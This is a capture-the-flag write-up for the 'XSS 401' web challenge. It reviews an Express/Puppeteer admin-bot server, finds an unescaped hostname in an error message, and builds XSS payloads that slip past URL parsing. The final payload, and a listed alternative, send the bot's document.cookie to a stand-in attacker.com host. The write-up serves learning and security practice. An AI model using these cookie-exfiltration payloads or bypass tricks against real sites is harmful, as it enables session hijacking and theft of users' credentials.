# Web: XSS 401

![image](https://user-images.githubusercontent.com/74207547/160824693-6ed7f954-fc1f-4c89-a29b-8e953caeedbb.png)

`The goal of the challenge is to get xss and steal admin bot's cookie`

## Website

![image](https://user-images.githubusercontent.com/74207547/160824984-73d35d51-6250-451d-b495-22fb7b97729f.png)

There is not much of a content. We can enter the url for bot to visit.

## Source code review

```js
const express = require('express')
const puppeteer = require('puppeteer')
const escape = require('escape-html')

const app = express()
const port = 80

app.use(express.static(__dirname + '/webapp'))

const visitUrl = async (url, cookieDomain) => {
    // Chrome generates this error inside our docker container when starting up.
    // However, it seems to run ok anyway.
    //
    // [0105/011035.292928:ERROR:gpu_init.cc(457)] Passthrough is not supported, GL is disabled, ANGLE is

    let browser =
            await puppeteer.launch({
                headless: true,
                pipe: true,
                dumpio: true,
                ignoreHTTPSErrors: true,

                // headless chrome in docker is not a picnic
                args: [
                    '--incognito',
                    '--no-sandbox',
                    '--disable-gpu',
                    '--disable-software-rasterizer',
                    '--disable-dev-shm-usage',
                ]
            })

    try {
        const ctx = await browser.createIncognitoBrowserContext()
        const page = await ctx.newPage()

        try {
            await page.setCookie({
                name: 'flag',
                value: process.env.FLAG,
                domain: cookieDomain,
                httpOnly: false,
                samesite: 'strict'
            })
            await page.goto(url, { timeout: 6000, waitUntil: 'networkidle2' })
        } finally {
            await page.close()
            await ctx.close()
        }
    }
    finally {
        browser.close()
    }
}

app.get('/visit', async (req, res) => {
    const url = req.query.url
    console.log('received url: ', url)

    let parsedURL
    try {
        parsedURL = new URL(url)
    }
    catch (e) {
        res.send(escape(e.message))
        return
    }

    if (parsedURL.protocol !== 'http:' && parsedURL.protocol != 'https:') {
        res.send('Please provide a URL with the http or https protocol.')
        return
    }

    if (parsedURL.hostname !== req.hostname) {
        res.send(`Please provide a URL with a hostname of: ${escape(req.hostname)}, your parsed hostname was: escape(${parsedURL.hostname})`)
        return
    }

    try {
        console.log('visiting url: ', url)
        await visitUrl(url, req.hostname)
        res.send('Our admin bot has visited your URL!')
    } catch (e) {
        console.log('error visiting: ', url, ', ', e.message)
        res.send('Error visiting your URL: ' + escape(e.message))
    } finally {
        console.log('done visiting url: ', url)
    }

})

app.listen(port, async () => {
    console.log(`Listening on ${port}`)
})
```

Simple puppeter setup. Our flag is in the bot's cookie

```js
if (parsedURL.hostname !== req.hostname) {
        res.send(`Please provide a URL with a hostname of: ${escape(req.hostname)}, your parsed hostname was: escape(${parsedURL.hostname})`)
        return
    }
```

This line stands out. Looks like there is no escaping from our url hostname.

```js
parsedURL = new URL(url)
```
The hostname is parsed by URL() function. Based on that I created payload to check if we can inject any html at first. 
`http://<b>Domons</b>`

![image](https://user-images.githubusercontent.com/74207547/160826836-b820f991-d0b7-4418-8f94-71c50bba7c01.png)

It worked. Next step is to get xss. That will be harder, since we cannot use spaces and slashes. Otherwise, the URL function will return an error when it encounters spaces and slice our payload to path not to the hostname when encounters slash. I searched for `XSS paylaod without spaces` and found this useful [post on stackexchange](https://security.stackexchange.com/questions/47684/what-is-a-good-xss-vector-without-forward-slashes-and-spaces) which uses %0c form feed character
`http://<svg%0conload=alert(123)>`

![image](https://user-images.githubusercontent.com/74207547/160828385-6ff4368a-21b8-456a-b9b2-6200a6af82d5.png)

It worked again. Next step is to fetch our private web server and add a cookie to the request. Normal payload would look like this `http://<svg%0conload=fetch('http://attacker.com'+document.cookie)` but URL function crashes when it sees next http wrapper.
<br><br>
We need to find a way to encode http wrapper into the fetch function. This one is a tricky part. Any type of encoding such as hex, octal won't work. URL function will decode that. The next problem is that the hostname is being converted to lowercase, which eliminates half of js built-in functions.

## Solution

There are plenty of solutions to that problem. I chose one of the most difficult. I decided to use atob() function which decodes base64 encoding. Since I couldn't use uppercase letters I had to find base64 code for each character `:, /` made up of lowercase only. 

* `atob('azo=')` -> `k:`
* `atob('ey8=')` -> `{/`

We can add slice(1) to each atob() function to get only the chars we want.
<br><br>
Final payload:
`http://<svg%0conload=fetch('https'+atob('azo=').slice(1)+atob('ey8=').slice(1)+atob('ey8=').slice(1)+'attacker.com'+atob('ey8=').slice(1)+document.cookie)>`
<br><br>
Steps to reproduce:
* enter the payload to url form for bot to visit
* copy the url of site where js pops off
* enter copied url into url form for bot to visit once again

![image](https://user-images.githubusercontent.com/74207547/160838650-18682562-fd03-4c7e-9d43-190c1b043227.png)

Other `http://` wrapper bypasses by other users:
* `window.location.protocol` -> `https://`
* `''.italics().at(4)` -> `/`
* `&colon;` -> `:`
* `&sol;` -> `/`
* `eval(location.hash.slice(1))%3E#window.open('http://atacker.com'.concat(document.cookie))` -> get the payload from http reference `#`

## Flag: wsc{wh0_kn3w_d0m41n_x55_w4s_4_th1n6}
